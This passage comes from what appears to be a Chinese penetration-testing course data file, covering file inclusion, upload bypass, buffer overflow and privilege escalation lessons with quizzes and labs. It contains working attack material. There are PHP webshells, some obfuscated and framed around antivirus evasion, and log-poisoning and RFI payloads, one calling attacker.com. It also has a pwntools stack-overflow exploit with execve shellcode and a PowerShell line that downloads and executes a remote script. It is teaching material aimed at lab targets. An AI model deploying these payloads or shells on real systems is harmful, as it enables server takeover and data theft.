      { author: '余弦', title: 'CSRF挖掘技巧', content: 'CSRF测试要关注所有有状态变更的操作：修改资料、转账、删除、添加等。先观察是否有Token，再测试绕过方法。Referer检查可被绕过，删除Referer头即可。', url: 'https://portswigger.net/' },
      { author: '渗透测试工程师', title: 'JSON CSRF利用', content: 'JSON API的CSRF需要特殊构造。利用text/plain和双引号特性：form的enctype=text/plain会自动处理数据，导致JSON变形可能被服务器接受。', url: 'https://www.owasp.org/' },
      { author: '安全研究员', title: 'CORS CSRF实战', content: '测试CORS CSRF时，先发送OPTIONS预检请求，检查Access-Control-Allow-Credentials和Access-Control-Allow-Origin。如果Origin是攻击者控制的域名，则存在漏洞。' }
    ],
    environmentSetup: {
      prerequisites: ['DVWA靶场运行', 'Burp Suite配置完成'],
      verificationSteps: ['1. 访问DVWA CSRF模块', '2. 观察Token字段', '3. 构造无Token的请求', '4. 测试绕过方法']
    }
  ,
      resources: [{"name": "CSRF攻击深度分析", "url": "https://portswigger.net/web-security/csrf", "type": "article"}, {"name": "CSRF绕过技术汇总", "url": "https://www.freebuf.com/articles/web/278901.html", "type": "article"}, {"name": "SameSite Cookie详解", "url": "https://web.dev/articles/samesite-cookies-explained", "type": "article"}, {"name": "CSRF与CORS关系", "url": "https://www.anquanke.com/post/id/289012", "type": "article"}]},
  { 
    id: 'pen-12', 
    day: 12, 
    title: '文件包含漏洞', 
    subtitle: 'File Inclusion', 
    objectives: ['掌握LFI/RFI原理', '伪协议利用', '日志投毒Getshell'], 
    content: `文件包含漏洞是由于PHP等语言允许动态包含文件，当包含路径可被用户控制时导致的严重漏洞。

【漏洞原理】
文件包含是PHP等语言的重要特性，允许将其他文件内容包含到当前文件执行：
• include "header.php"
• require "config.php"

如果包含路径来自用户输入且未过滤，攻击者可包含任意文件：
• index.php?page=user_input → index.php?page=../../../etc/passwd

【LFI本地文件包含】
LFI(Local File Inclusion)只能包含服务器本地文件。

常见利用方式：
1. 读取系统敏感文件
   ?page=../../../etc/passwd
   ?page=../../../Windows/System32/drivers/etc/hosts

2. 读取应用程序文件
   ?page=../../../var/www/html/config.php
   ?page=../../../app/application/config/database.php

3. 读取日志文件
   ?page=../../../var/log/apache2/access.log
   ?page=../../../var/log/nginx/access.log

4. 读取Session文件
   ?page=../../../var/lib/php/session/sess_PHPSESSID

【RFI远程文件包含】
RFI(Remote File Inclusion)可以包含远程服务器的文件，需allow_url_fopen=On和allow_url_include=On。

利用条件：
• PHP配置：allow_url_fopen = On, allow_url_include = On
• 服务器能访问攻击者的恶意文件

攻击示例：
?page=http://attacker.com/shell.txt
shell.txt内容：<?php system($_GET["cmd"]); ?>

【PHP伪协议利用】
PHP内置多种协议，可用于文件包含攻击：

1. php://filter - 读取文件内容（Base64编码）
   ?page=php://filter/convert.base64-encode/resource=index.php
   获取index.php源码（Base64编码）

2. php://input - 读取POST数据当PHP代码执行
   ?page=php://input
   POST发送：<?php system($_GET["cmd"]); ?>

3. data://text/plain - 内嵌数据协议
   ?page=data://text/plain,<?php system($_GET["cmd"]); ?>

4. zip:// - 包含压缩包内文件
   ?page=zip://shell.zip#shell.php

【日志投毒Getshell】
通过User-Agent等HTTP头将PHP代码写入日志，然后LFI包含日志文件执行。

步骤：
1. 发送包含恶意代码的请求
   GET / HTTP/1.1
   Host: target.com
   User-Agent: <?php system($_GET["cmd"]); ?>

2. 代码被写入日志文件
   /var/log/apache2/access.log

3. LFI包含日志文件
   ?page=../../../var/log/apache2/access.log

4. 配合cmd参数执行命令
   ?page=../../../var/log/apache2/access.log&cmd=whoami

【Session文件包含】
PHP Session文件通常存储在/tmp或/var/lib/php/session/
文件名格式：sess_PHPSESSID

利用方式：
1. 先通过XSS获取用户Session ID
2. LFI包含Session文件
   ?page=../../../var/lib/php/session/sess_abcd1234

3. Session中可能存储用户可控的数据

【防御措施】
• 禁用远程文件包含：allow_url_include = Off
• 使用白名单：只允许包含指定文件
• 过滤特殊字符：../ ..等
• 使用basename()、dirname()处理路径
• 关闭错误显示：display_errors = Off`, 
    keyPoints: ['LFI包含服务器本地文件', 'RFI可执行远程代码', 'php://filter可读源码', '日志文件可被包含执行', 'Session文件可被利用', 'allow_url_include需开启才能RFI'],
    codeExamples: [{ title: 'LFI日志投毒攻击脚本', language: 'python', code: `import requests\nimport sys\n\ndef exploit_lfi(target, session_cookie):\n    # 1. 写入恶意代码到日志\n    headers = {\n        "User-Agent": "<?php system($_GET['cmd']); ?>\"\n    }\n    cookies = {"PHPSESSID": session_cookie}\n    \n    print(\"[+] 发送恶意请求写入日志...\")\n    requests.get(target, headers=headers, cookies=cookies)\n    \n    # 2. LFI包含日志文件\n    log_paths = [\n        "/var/log/apache2/access.log\",\n        \"/var/log/httpd/access_log\",\n        \"/var/log/nginx/access.log\"\n    ]\n    \n    for log_path in log_paths:\n        print(f\"[+] 尝试包含: {log_path}\")\n        url = f\"{target}?page=php://filter/convert.base64-encode/resource={log_path}\"\n        try:\n            r = requests.get(url, cookies=cookies)\n            if \"<?php\" in r.text or \"apache\" in r.text.lower():\n                print(f\"[+] 找到日志文件!\")\n                return log_path\n        except:\n            pass\n    \n    return None\n\n# 使用示例\n# python lfi_exploit.py http://target.com/index.php?sess=abc123`, explanation: 'LFI日志投毒攻击脚本，演示如何通过User-Agent写入日志并包含执行' }],
    labEnvironment: [{ name: '文件包含练习', description: '搭建包含漏洞的测试环境', url: 'https://www.vulnhub.com/', type: 'local', setup: '1. 使用Docker搭建有LFI漏洞的Web应用\n2. 安装DVWA并设置安全级别为Low\n3. 访问DVWA File Inclusion模块\n4. 尝试各种伪协议和日志投毒\n5. 使用Burp Suite拦截请求修改User-Agent', expectedOutput: '掌握LFI/RFI利用，能读取敏感文件并Getshell' }],
    recommendedTools: [{ name: 'Burp Suite', description: 'Web安全测试工具', url: 'https://portswigger.net/burp', type: 'local' }, { name: 'Kali Linux', description: '渗透测试发行版', url: 'https://www.kali.org/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'LFI和RFI的区别是？', options: ['A. LFI只能本地，RFI可以远程', 'B. LFI需要认证，RFI不需要', 'C. LFI读取文件，RFI写入文件', 'D. 没有区别'], correctIndex: 0, explanation: 'LFI(Local File Inclusion)只能包含本地文件，RFI(Remote File Inclusion)可以包含远程服务器的文件。' },
      { type: 'single', question: 'php://filter的作用是？', options: ['A. 执行PHP代码', 'B. 读取文件内容（Base64编码）', 'C. 读取POST数据', 'D. 包含远程文件'], correctIndex: 1, explanation: 'php://filter是PHP伪协议，用于读取文件内容并可进行Base64编码等过滤操作。' },
      { type: 'boolean', question: 'RFI利用需要allow_url_include=On。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: '远程文件包含需要PHP配置allow_url_include=On才能包含远程URL。' },
      { type: 'fill', question: '日志投毒通过写入PHP代码到______，然后LFI包含执行。', correctAnswer: '日志文件', explanation: '通过User-Agent等HTTP头将PHP代码写入access.log，然后LFI包含日志文件执行代码。' },
      { type: 'multiple', question: '以下哪些是PHP伪协议？（多选）', options: ['A. php://filter', 'B. php://input', 'C. data://', 'D. mysql://'], correctIndices: [0, 1, 2], explanation: 'php://filter、php://input、data://都是PHP伪协议，可用于文件包含攻击。' },
      { type: 'single', question: '读取PHP源码而不执行用什么伪协议？', options: ['A. php://input', 'B. php://filter', 'C. data://', 'D. zip://'], correctIndex: 1, explanation: 'php://filter可以读取文件内容进行Base64编码，获取PHP源码而不执行。' }
    ],
    expertNotes: [
      { author: '余弦', title: 'LFI利用技巧', content: 'LFI实战中，优先尝试日志文件包含(log poisoning)。通过User-Agent或Referer写入PHP代码，然后包含日志执行。先用php://filter读取日志确认代码写入成功。', url: 'https://portswigger.net/' },
      { author: '渗透测试工程师', title: 'Session文件利用', content: 'Session文件包含是LFI利用的重要方式。找到Session ID后，构造包含session文件。Session文件路径可能是/tmp/sess_xxx或/var/lib/php/sessions/sess_xxx。', url: 'https://www.php.net/' },
      { author: '安全研究员', title: 'RFI Getshell', content: 'RFI直接包含远程恶意文件即可Getshell。构造恶意PHP文件放在自己服务器上，文件名必须以.php结尾或包含有效PHP代码。防御：关闭allow_url_include。' }
    ],
    environmentSetup: {
      prerequisites: ['DVWA靶场运行', 'Burp Suite配置完成'],
      verificationSteps: ['1. 访问DVWA File Inclusion', '2. 尝试各种伪协议', '3. 日志投毒实验', '4. 确认PHP配置']
    }
  ,
      resources: [{"name": "文件包含漏洞详解", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion", "type": "article"}, {"name": "LFI to RCE技巧", "url": "https://www.freebuf.com/articles/web/298023.html", "type": "article"}, {"name": "PHP伪协议利用", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}, {"name": "日志注入与文件包含", "url": "https://www.freebuf.com/articles/web/289012.html", "type": "article"}]},
  { 
    id: 'pen-13', 
    day: 13, 
    title: '文件上传绕过', 
    subtitle: 'Advanced File Upload', 
    objectives: ['掌握MIME绕过', '扩展名绕过', '竞争条件上传'], 
    content: `文件上传漏洞是Web应用中最危险的漏洞之一，允许上传恶意文件并执行。

【漏洞原理】
Web应用允许用户上传文件（头像、文档等），但未严格验证文件类型和内容。攻击者可上传恶意文件（Webshell），然后通过访问该文件在服务器上执行任意命令。

危险函数：
• PHP: system(), exec(), shell_exec(), eval(), assert()
• ASP: <% eval request("shell") %>
• JSP: Runtime.getRuntime().exec()

【上传攻击流程】
1. 上传正常文件测试功能
2. 上传恶意文件（.php, .asp, .jsp）
3. 绕过服务器验证
4. 访问上传文件URL
5. 执行恶意代码获取服务器权限

【客户端验证绕过】
只依赖JavaScript验证，可通过以下方式绕过：
1. 删除浏览器JavaScript
2. 修改表单onsubmit事件
3. 使用Burp Suite拦截并修改
4. 禁用JavaScript

【MIME类型绕过】
MIME类型在请求头Content-Type中指定，服务器可能只检查这个字段。

常见MIME类型：
• image/jpeg - JPG图片
• image/png - PNG图片
• application/pdf - PDF文档
• text/plain - 文本文件

恶意PHP文件的MIME是application/octet-stream
绕过方法：用Burp Suite拦截请求，修改Content-Type为image/jpeg

【扩展名绕过】
服务器可能只检查文件扩展名，可用各种变形绕过：

1. 大小写混用
   shell.PhP, shell.pHp, shell.PHP

2. 罕见扩展名
   shell.php3, shell.php4, shell.php5, shell.phtml
   shell.asp, shell.aspx, shell.asa
   shell.jsp, shell.jspx, shell.jsw

3. 双重扩展名
   shell.jpg.php - 检查.jpg时认为是图片，但服务器执行.php
   shell.php.jpg - 有些服务器从后往前检查

4. 空字节绕过（00截断）
   shell.php%00.jpg - %00是字符串结束符
   shell.php .jpg - 空格截断
   shell.php:jpg - Windows流文件

5. .htaccess攻击
   上传.htaccess文件修改服务器配置：
   AddType application/x-httpd-php .abc
   然后上传shell.abc

6. .user.ini攻击
   auto_prepend_file=shell.png
   然后上传shell.png包含PHP代码

【竞争条件上传】
利用检查和保存之间的时间差：
1. 快速发送多个上传请求
2. 同时发送访问请求
3. 在检查完成前访问已上传的文件

【文件内容检测绕过】
服务器可能检测文件内容：
1. 图片头欺骗
   GIF89a - GIF图片头
   <?php system($_GET['cmd']); ?> - 后面跟PHP代码
   文件后缀仍为.gif，但包含PHP代码

2. 文件包含
   文件内容：GIF89a<?php include($_GET['file']); ?>
   访问时：upload.php?file=shell.txt

3. EXIF数据隐藏
   使用工具修改图片EXIF数据嵌入PHP代码

【Getshell方法】
1. 一句话木马（最短Webshell）
   <?php @eval($_POST['shell']); ?>
   
2. 冰蝎Webshell
   <?php @eval(base64_decode($_POST['a'])); ?>

3. 蚁剑Webshell
   <?php
   $k="base64_decode";
   @eval($k($_POST['ant']));
   ?>

4. 命令执行
   <?php system($_GET['cmd']); ?>

【防御措施】
• 文件类型检测：检查Content-Type和扩展名
• 文件内容检测：验证文件头部
• 重命名文件：不使用用户上传的文件名
• 存储分离：上传目录与Web根目录分离
• 权限控制：上传目录无执行权限
• 白名单：只允许指定扩展名
• 图片处理：使用GD库重新生成图片`,
    keyPoints: ['Webshell是最危险的上传后果', 'MIME类型可抓包修改', '00截断是经典绕过', '竞争上传利用时间差', '.htaccess可修改配置', '图片头+PHP代码可绕过检测'],
    codeExamples: [{ title: '文件上传检测脚本', language: 'python', code: `import requests\nimport sys\n\ndef test_upload(target_url, file_path):\n    # 读取要上传的文件\n    with open(file_path, "rb") as f:\n        file_data = f.read()\n    \n    # 测试各种绕过\n    bypasses = [\n        # 原始文件\n        ("shell.php", "application/octet-stream"),\n        # MIME绕过\n        ("shell.php", "image/jpeg"),\n        ("shell.php", "image/png"),\n        # 扩展名绕过\n        ("shell.php3", "application/octet-stream"),\n        ("shell.php5", "application/octet-stream"),\n        ("shell.phtml", "application/octet-stream"),\n        # 双重扩展名\n        ("shell.jpg.php", "image/jpeg"),\n        ("shell.php.jpg", "image/jpeg"),\n        # 空字节 - 使用chr(0)构造
        ("shell.php\x00.jpg", "image/jpeg"),\n    ]\n    \n    for filename, content_type in bypasses:\n        files = {"file\": (filename, file_data, content_type)}\n        try:\n            r = requests.post(target_url, files=files, timeout=5)\n            print(f\"[+] 测试: {filename} ({content_type})\")\n            # 检查是否上传成功\n            if "success" in r.text.lower() or r.status_code == 200:\n                print(f\"[+] 可能成功! 检查上传目录\")\n        except Exception as e:\n            print(f\"[-] 错误: {e}\")\n\n# Usage\n# python upload_test.py http://target.com/upload.php shell.php`, explanation: '文件上传绕过测试脚本，测试各种MIME和扩展名绕过' }],
    labEnvironment: [{ name: '文件上传练习', description: '在DVWA中练习文件上传绕过', url: 'http://localhost:8081', type: 'docker', setup: '1. 访问DVWA File Upload页面\n2. 设置安全级别为Low\n3. 上传正常PHP文件测试\n4. 使用Burp Suite绕过MIME检测\n5. 尝试各种扩展名绕过\n6. 使用蚁剑连接Webshell', expectedOutput: '掌握各种文件上传绕过方法，能成功上传Webshell' }],
    recommendedTools: [{ name: 'Burp Suite', description: 'Web安全测试工具', url: 'https://portswigger.net/burp', type: 'local' }, { name: '蚁剑', description: 'Webshell管理工具', url: 'https://github.com/AntSwordProject/AntSword', type: 'local' }],
    quiz: [
      { type: 'single', question: '文件上传后获取服务器权限的技术是？', options: ['A. SQL注入', 'B. XSS', 'C. Webshell', 'D. CSRF'], correctIndex: 2, explanation: '上传恶意文件（Webshell）后访问执行，可在服务器上执行任意命令，获取服务器权限。' },
      { type: 'single', question: '00截断的原理是？', options: ['A. ASCII码0被解析为字符串结束', 'B. 文件名相同', 'C. 文件权限改变', 'D. 文件被压缩'], correctIndex: 0, explanation: '空字节(ASCII 0)在字符串处理时被当作结束符，后面的内容被截断，如shell.php%00.jpg变成shell.php。' },
      { type: 'boolean', question: '只检查Content-Type就认为文件安全。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'Content-Type可被攻击者随意修改，只检查Content-Type是不安全的。' },
      { type: 'fill', question: '在图片文件中嵌入PHP代码的技术叫图片______。', correctAnswer: '头欺骗', explanation: '在图片文件头部(GIF89a等)后面添加PHP代码，可绕过仅检查文件头部的验证。' },
      { type: 'multiple', question: '以下哪些是文件上传绕过方法？（多选）', options: ['A. MIME类型修改', 'B. 00截断', 'C. SQL注入', 'D. 双重扩展名'], correctIndices: [0, 1, 3], explanation: 'MIME类型修改、00截断、双重扩展名都是文件上传绕过方法，SQL注入是另一种漏洞类型。' },
      { type: 'single', question: '.htaccess文件的作用是？', options: ['A. 上传图片', 'B. 修改服务器配置使指定扩展名被当作PHP执行', 'C. 删除文件', 'D. 加密文件'], correctIndex: 1, explanation: '.htaccess可添加AddType指令，让.abc等扩展名被Apache当作PHP执行，然后上传shell.abc。' }
    ],
    expertNotes: [
      { author: '余弦', title: '文件上传挖掘技巧', content: '文件上传测试要关注：头像上传、文档上传、附件上传。先上传正常文件测试功能，再上传.php文件测试。多尝试扩展名：php3、php4、php5、phtml等。', url: 'https://portswigger.net/' },
      { author: '渗透测试工程师', title: '竞争条件利用', content: '竞争上传需要用工具快速发送多个请求。Burp Suite的Intruder或自定义脚本可实现。使用Python的threading同时上传和访问，大幅提高成功率。', url: 'https://github.com/AntSwordProject/AntSword' },
      { author: '安全研究员', title: 'Webshell免杀', content: '常用一句话木马容易被查杀。使用冰蝎、哥斯拉等加密Webshell，或自己编写自定义shell，避免被杀软检测。分离免杀：图片+shell合并执行。' }
    ],
    environmentSetup: {
      prerequisites: ['DVWA靶场运行', 'Burp Suite配置完成', '蚁剑已安装'],
      verificationSteps: ['1. 上传正常文件测试', '2. 绕过验证上传Webshell', '3. 使用蚁剑连接', '4. 执行命令测试']
    }
  ,
      resources: [{"name": "文件上传绕过专题", "url": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload", "type": "article"}, {"name": "文件上传WAF绕过", "url": "https://www.freebuf.com/articles/web/278901.html", "type": "article"}, {"name": "图片马生成技术", "url": "https://www.anquanke.com/post/id/298023", "type": "article"}, {"name": ".htaccess绕过技巧", "url": "https://www.freebuf.com/articles/web/289012.html", "type": "article"}]},
  { 
    id: 'pen-14', 
    day: 14, 
    title: '缓冲区溢出基础', 
    subtitle: 'Buffer Overflow Basics', 
    objectives: ['理解溢出原理', '掌握栈结构', '简单利用演示'], 
    content: `缓冲区溢出是软件安全中最经典的漏洞类型，攻击者通过覆盖返回地址控制程序执行流。

【溢出原理】
程序在内存中分配缓冲区存储数据，当写入的数据超过缓冲区大小时，会溢出到相邻内存区域。

例如：char buffer[64]; strcpy(buffer, user_input);
如果user_input超过64字节，溢出的数据会覆盖其他内存区域。

【内存布局】
程序内存从高地址到低地址：
• 栈(Stack)：函数调用、局部变量、返回地址
• 堆(Heap)：动态分配内存
• BSS段：未初始化全局变量
• 数据段：全局变量
• 代码段(Text)：程序指令

【栈结构详解】
函数调用时栈帧布局（从高到低）：
1. 参数(Arguments)：函数参数
2. 返回地址(Return Address)：函数调用后返回的位置
3. 保存的EBP(Saved EBP)：上一函数栈帧基址
4. 局部变量(Local Variables)：函数内声明的变量
5. 缓冲区(Buffer)：存储数据的区域

栈生长方向：从高地址向低地址

【溢出过程演示】
strcpy(buffer, user_input);
buffer[64]开始是Saved EBP，buffer[68]是Return Address

当user_input超过64字节时：
• 64-67字节：覆盖Saved EBP
• 68-71字节：覆盖Return Address

覆盖后，函数返回时跳转到攻击者指定的地址。

【溢出利用关键点】
1. 确定溢出偏移
   - 确定距返回地址的精确距离
   - 使用pattern_create生成唯一字符串
   - pattern_offset查找返回地址位置

2. 覆盖返回地址
   - 跳转到shellcode所在地址
   - 跳转到栈上的shellcode
   - 跳转到已知地址（如JMP ESP）

3. 构造shellcode
   - 编写执行命令的机器码
   - 如：exec("/bin/sh") 或 download & execute

【JMP ESP跳转技术】
如果无法直接在栈上执行代码（DEP防护），可使用JMP ESP技术：

1. 在程序中找到JMP ESP指令地址
2. 覆盖返回地址为JMP ESP地址
3. 返回时先执行JMP ESP
4. CPU跳转到栈上shellcode执行

常用寄存器：
• EIP：指令指针，指向下一条要执行的指令
• ESP：栈指针，指向栈顶
• EBP：基址指针，指向当前栈帧

【防护机制】
1. DEP/NX（Data Execution Prevention）
   - 标记内存区域为不可执行
   - 栈和堆默认不可执行
   - 绕过：ROP（Return-Oriented Programming）

2. ASLR（Address Space Layout Randomization）
   - 随机化内存地址
   - 栈、堆、共享库地址随机化
   - 绕过：信息泄露、暴力破解（部分偏移固定）

3. Stack Canary（栈保护）
   - 在返回地址前插入随机值
   - 函数返回前检查Canary是否被修改
   - 绕过：泄露Canary、格式化字符串漏洞

4. SafeSEH
   - 保护异常处理程序
   - 绕过：利用未保护模块

5. 安全函数
   - 使用strcpy_s、strncpy_s等安全函数
   - 这些函数会检查长度

【常用工具】
• gdb/LLLDB：Linux调试器
• Immunity Debugger：Windows调试器
• WinDBG：高级Windows调试器
• Mona.py：WinDBG插件，辅助漏洞利用
• Pwntools：Python漏洞利用库
• Radare2：逆向工程框架

【实战利用步骤】
1. 分析目标程序，找到输入点
2. 确定溢出偏移（计算到返回地址的距离）
3. 找到JMP ESP或可用gadget地址
4. 构造exploit：填充数据 + JMP ESP地址 + shellcode
5. 触发溢出，执行shellcode

【简单示例】
import struct

# 假设溢出偏移是64字节
offset = 64
# JMP ESP地址（需从程序或模块中找）
jmp_esp = struct.pack("<I", 0x08041413)  # 小端序
# Shellcode: execve("/bin/sh")
# 使用msfvenom生成: msfvenom -p linux/x86/exec CMD=/bin/sh -f py
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
# 构造payload
payload = b"A" * offset + jmp_esp + shellcode`, 
    keyPoints: ['缓冲区溢出覆盖返回地址', '栈从高地址向低地址生长', 'strcpy无边界检查导致溢出', 'JMP ESP跳转到shellcode', 'DEP禁止执行栈上代码', 'ASLR随机化内存地址'],
    codeExamples: [{ title: '简单缓冲区溢出脚本', language: 'python', code: `#!/usr/bin/env python3\nfrom pwn import *\n\n# 连接到目标程序\n# p = process("./vulnerable_program")  # 本地测试\np = remote("target.com", 4444)\n\n# 接收程序输出，获取信息\nprint(p.recvline())\n\n# 构造溢出数据\n# 假设偏移是64字节，返回地址在64-67\n# 68字节开始是返回地址\n\noffset = 64\njmp_esp_addr = p32(0x08041413)  # JMP ESP地址\n\n# Linux x86 execve("/bin/sh") shellcode\n# 23字节\nshellcode = (\n    b"\\x31\\xc0\"              # xor eax, eax\n    b"\\x50\"                  # push eax\n    b\"\\x68//sh\"             # push \"//sh\"\n    b\"\\x68/bin\"             # push \"/bin\"\n    b\"\\x89\\xe3\"             # mov ebx, esp\n    b\"\\x50\"                  # push eax\n    b\"\\x53\"                  # push ebx\n    b\"\\x89\\xe1\"             # mov ecx, esp\n    b\"\\x99\"                  # cdq\n    b\"\\xb0\\x0b\"             # mov al, 11 (sys_execve)\n    b\"\\xcd\\x80\"              # int 0x80\n)\n\n# 构造payload\noverflow = b"A" * offset\noverflow += jmp_esp_addr\noverflow += shellcode\n\n# 发送payload\np.sendline(overflow)\n\n# 获取shell\np.interactive()`, explanation: '使用pwntools构造简单缓冲区溢出exploit' }],
    labEnvironment: [{ name: '缓冲区溢出练习', description: '搭建溢出练习环境', url: 'https://www.vulnhub.com/', type: 'local', setup: '1. 安装Kali Linux\n2. 下载Vulnhub缓冲区溢出靶机\n3. 使用Immunity Debugger分析程序\n4. 安装Mona.py插件\n5. 找到溢出偏移和JMP ESP地址\n6. 构造exploit', expectedOutput: '理解缓冲区溢出原理，能编写简单exploit' }],
    recommendedTools: [{ name: 'Immunity Debugger', description: 'Windows调试器', url: 'https://www.immunityinc.com/', type: 'local' }, { name: 'Pwntools', description: 'Python漏洞利用库', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }],
    quiz: [
      { type: 'single', question: '缓冲区溢出主要覆盖什么？', options: ['A. 变量值', 'B. 返回地址', 'C. 函数名', 'D. 文件内容'], correctIndex: 1, explanation: '缓冲区溢出覆盖返回地址，当函数返回时跳转到攻击者指定的地址执行代码。' },
      { type: 'single', question: '栈的生长方向是？', options: ['A. 从低地址向高地址', 'B. 从高地址向低地址', 'C. 随机', 'D. 由CPU决定'], correctIndex: 1, explanation: '栈从高地址向低地址生长，所以局部变量会出现在返回地址之前。' },
      { type: 'boolean', question: 'DEP防护允许栈上代码执行。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'DEP(Data Execution Prevention)标记栈为不可执行，禁止栈上代码执行，防止溢出攻击。' },
      { type: 'fill', question: '栈保护机制在返回地址前插入随机值叫Stack ______。', correctAnswer: 'Canary', explanation: 'Stack Canary是栈保护机制，在返回地址前插入随机值，函数返回时检查是否被修改。' },
      { type: 'multiple', question: '以下哪些是缓冲区溢出防护机制？（多选）', options: ['A. DEP/NX', 'B. ASLR', 'C. Stack Canary', 'D. SQL注入过滤'], correctIndices: [0, 1, 2], explanation: 'DEP、ASLR、Stack Canary都是缓冲区溢出防护机制，SQL注入过滤是防护SQL注入的。' },
      { type: 'single', question: 'JMP ESP技术用于绕过什么防护？', options: ['A. ASLR', 'B. DEP', 'C. Stack Canary', 'D. 防火墙'], correctIndex: 1, explanation: 'JMP ESP用于绕过DEP，跳转到栈上shellcode执行。DEP禁止栈上代码执行，但跳转指令可以先执行。' }
    ],
    expertNotes: [
      { author: '安全研究员', title: '漏洞利用开发入门', content: '学习漏洞利用要扎实基础：汇编语言、内存布局、调试器使用。从简单的溢出开始，理解原理后再学习绕过技术。Pwntools是强大的利用开发工具。', url: 'https://github.com/Gallopsled/pwntools' },
      { author: '渗透测试工程师', title: '调试技巧', content: '调试溢出程序时，用Immunity Debugger配合Mona.py。!mona pattern_create生成字符模式，!mona pattern_offset快速找到偏移。学会找JMP ESP地址。', url: 'https://www.immunityinc.com/' },
      { author: '网络安全老司机', title: '现代溢出利用', content: '现代系统有多种缓解机制，需要组合绕过：DEP+ASLR需要信息泄露或ROP；Stack Canary需要泄露或格式化字符串。漏洞利用已从简单的溢出发展到复杂的ROP链。' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux', 'Immunity Debugger', 'Pwntools'],
      verificationSteps: ['1. 安装Pwntools', '2. 搭建溢出练习程序', '3. 调试找到偏移', '4. 编写exploit成功利用']
    }
  ,
      resources: [{"name": "缓冲区溢出基础教程", "url": "https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/", "type": "article"}, {"name": "x86汇编入门", "url": "https://www.cs.virginia.edu/~evans/cs216/guides/x86.html", "type": "article"}, {"name": "GDB调试完全指南", "url": "https://www.freebuf.com/articles/system/298023.html", "type": "article"}, {"name": "二进制安全入门", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}]}
];

const week3: CyberDay[] = [
  { 
    id: 'pen-15', 
    day: 15, 
    title: '系统权限提升思路', 
    subtitle: 'Privilege Escalation', 
    objectives: ['理解提权原理', '掌握信息收集', '学习常用技术'], 
    content: `权限提升是从低权限用户获取系统最高权限的过程，是渗透测试中最关键的环节之一。

【提权原理】
当渗透测试中获得低权限shell后，需要利用系统漏洞、配置错误或弱密码等途径提升到管理员或root权限。提权的本质是让系统允许当前用户执行原本无权执行的特权操作。

【Windows提权思路】
• 系统漏洞未打补丁：使用Windows Exploit Suggester或winPEAS查找可用漏洞
• 服务配置错误：服务以SYSTEM权限运行且配置不当
• 计划任务：查看可修改的计划任务脚本
• 注册表alwaysInstallElevated：允许以SYSTEM权限安装MSI
• 密码复用：数据库配置、注册表存储的密码
• DLL劫持：应用程序加载顺序问题

【Linux提权思路】
• 内核漏洞：uname -r查版本，searchsploit搜索对应exploit
• SUID/SGID文件：find / -perm -u=s -type f 2>/dev/null
• sudo权限误配：sudo -l查看可用的sudo命令
• 定时任务：crontab -l查看定时任务，脚本可被修改
• 密码复用：配置文件、历史命令、数据库连接
• 共享库劫持：LD_PRELOAD或rpactor特性
• NFS共享：no_root_squash选项可导致root文件写入

【信息收集命令】
Windows：
• whoami /all - 显示当前用户和权限
• systeminfo - 系统详细信息
• net user /domain - 域用户信息
• wmic qfe list - 已安装补丁
• netstat -ano - 网络连接
• tasklist /svc - 运行的服务

Linux：
• whoami && id - 当前用户信息
• uname -a - 系统内核版本
• cat /etc/issue - 发行版信息
• sudo -l - sudo权限
• find / -perm -u=s -type f 2>/dev/null - SUID文件
• cat /etc/crontab - 定时任务
• ls -la /var/log/ - 日志目录权限

【提权辅助工具】
• winPEAS：Windows特权提升检查脚本
• linPEAS：Linux特权提升检查脚本
• linux-exploit-suggester：Linux内核漏洞检测
• Windows-Exploit-Suggester：Windows漏洞检测
• PowerSploit：PowerShell提权模块`, 
    keyPoints: ['提权从低权限到高权限', '信息收集是提权第一步', 'Windows查已安装补丁', 'Linux查SUID文件', '内核漏洞是常见提权方式', '密码复用经常被忽视'],
    codeExamples: [{ title: '提权信息收集脚本', language: 'bash', code: `#!/bin/bash\necho "[*] Linux Privilege Escalation Check"\necho "[*] Current User: $(whoami)"\necho "[*] OS Info:"\ncat /etc/issue\nuname -a\necho "[*] SUID Files:"\nfind / -perm -u=s -type f 2>/dev/null\necho "[*] Sudo Permissions:"\nsudo -l 2>/dev/null\necho "[*] Cron Jobs:"\ncat /etc/crontab\nls -la /var/spool/cron/ 2>/dev/null\necho "[*] Network Connections:"\nnetstat -tulnpecho "[*] Sensitive Files:"\ncat /etc/passwd | grep -v nologin`, explanation: 'Linux提权信息收集综合脚本' }, { title: 'Windows提权检查命令', language: 'powershell', code: '# Windows提权检查命令\n\n# 查看当前用户和权限\nwhoami /all\nwhoami /priv\n\n# 系统信息\nsysteminfo\necho %username%\n\n# 查看已安装补丁（找未打补丁的）\nwmic qfe list\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# 查看服务\nsc query\nsc qc [service_name]\n\n# 查看计划任务\nschtasks /query /fo LIST /v\n\n# 查看开机启动项\nwmic startup get command,caption\n\n# 查看注册表AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# 使用winPEAS\nIEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts/master/winPEAS/winPEASbat/winPEAS.bat")', explanation: 'Windows提权信息收集命令' }],
